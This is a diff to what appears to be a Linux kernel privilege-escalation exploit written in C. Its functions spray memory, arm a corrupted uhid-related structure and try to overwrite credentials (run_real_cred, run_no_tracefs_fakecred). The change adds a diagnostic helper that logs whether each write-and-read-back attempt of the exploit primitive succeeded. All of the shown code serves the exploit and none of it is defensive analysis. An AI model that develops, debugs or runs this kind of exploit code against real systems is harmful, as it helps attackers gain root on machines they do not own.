@@ -2514,6 +2514,22 @@ static int outq_read(struct anchor *a, unsigned char *out, size_t n) {
     return 0;
 }
 
+static void self_cell_diag(int i, int rc, int err, const unsigned char *buf,
+                           unsigned long long p0, long spray_n)
+{
+    if (rc == 0) {
+        unsigned long long got = *(const unsigned long long *)buf;
+        printf("[self] attempt %d spray=%ld got=%016llx want=%016llx %s\n", i,
+               spray_n, got, p0, got == p0 ? "match" : "MISMATCH");
+        PLOG("self attempt %d got=%016llx want=%016llx\n", i, got, p0);
+    } else {
+        printf("[self] attempt %d rc=%d errno=%d %s\n", i, rc, err,
+               rc > 0 ? "(EAGAIN: head==tail, arming lost)"
+                      : "(read path refused; slot not ours or not faulting)");
+        PLOG("self attempt %d rc=%d errno=%d\n", i, rc, err);
+    }
+}
+
 /* --- armed holders --------------------------------------------------- */
 
 /*
@@ -4373,10 +4389,15 @@ static int run_real_cred(struct anchor *a, unsigned long long base,
             abort_armed_and_park("bootstrap fire failed");
         }
         for (i = 0; i < 12 && !ok; i++) {
+            int rc, err;
             if (pc_write(&pa, base + UHID_HEAD_OFF, 0, (int)(p0 & 0xffffffff),
                          spray_n) < 0)
                 break;
-            if (outq_read(a, buf, 4096) != 0)
+            errno = 0;
+            rc = outq_read(a, buf, 4096);
+            err = errno;
+            self_cell_diag(i, rc, err, buf, p0, spray_n);
+            if (rc != 0)
                 continue;
             ok = *(unsigned long long *)buf == p0;
         }
@@ -5012,10 +5033,15 @@ static int run_tracefs(struct anchor *a, unsigned long long base,
                              o->spread_ms) < 0)
                 abort_armed_and_park("bootstrap fire failed");
             for (int i = 0; i < 12 && !ok; i++) {
+                int rc, err;
                 if (pc_write(&pa, base + UHID_HEAD_OFF, 0,
                              (int)(p0 & 0xffffffff), o->spray_n) < 0)
                     break;
-                if (outq_read(a, buf, 4096) != 0)
+                errno = 0;
+                rc = outq_read(a, buf, 4096);
+                err = errno;
+                self_cell_diag(i, rc, err, buf, p0, o->spray_n);
+                if (rc != 0)
                     continue;
                 ok = *(unsigned long long *)buf == p0;
             }
@@ -5304,10 +5330,15 @@ static int run_no_tracefs_fakecred(struct anchor *a, unsigned long long base,
                      (int)(p0 >> 32), o->spray_n, o->spread_ms) < 0)
         abort_armed_and_park("bootstrap fire failed");
     for (i = 0; i < 4 && !ok; i++) {
+        int rc, err;
         if (pc_write(&pa, base + UHID_HEAD_OFF, 0, (int)(p0 & 0xffffffff),
                      o->spray_n) < 0)
             break;
-        if (outq_read(a, buf, 4096) != 0)
+        errno = 0;
+        rc = outq_read(a, buf, 4096);
+        err = errno;
+        self_cell_diag(i, rc, err, buf, p0, o->spray_n);
+        if (rc != 0)
             continue;
         ok = *(unsigned long long *)buf == p0;
     }
